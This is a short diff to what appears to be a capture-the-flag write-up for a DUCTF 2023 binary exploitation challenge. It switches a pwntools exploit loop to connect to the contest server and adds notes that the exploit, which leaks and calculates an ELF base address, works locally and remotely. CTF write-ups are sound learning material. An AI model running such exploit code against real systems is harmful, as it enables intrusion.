@@ -256,8 +256,8 @@ continue
 
 for i in range(20):
     try:
-        io = start()
-        # io = remote('2023.ductf.dev', '30018')
+        #io = start()
+        io = remote('2023.ductf.dev', '30018')
 
         # Leak & Calculate ELF Base Address
         io.recvuntil('Free junk:')
@@ -279,4 +279,8 @@ for i in range(20):
         pass
 ```
 
+Running it locally works (that's a fake flag I made for local testing)
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/5f4cb4fd-d2aa-4957-b25a-3271a0f91f96)
+
+On running it remotely works also
 
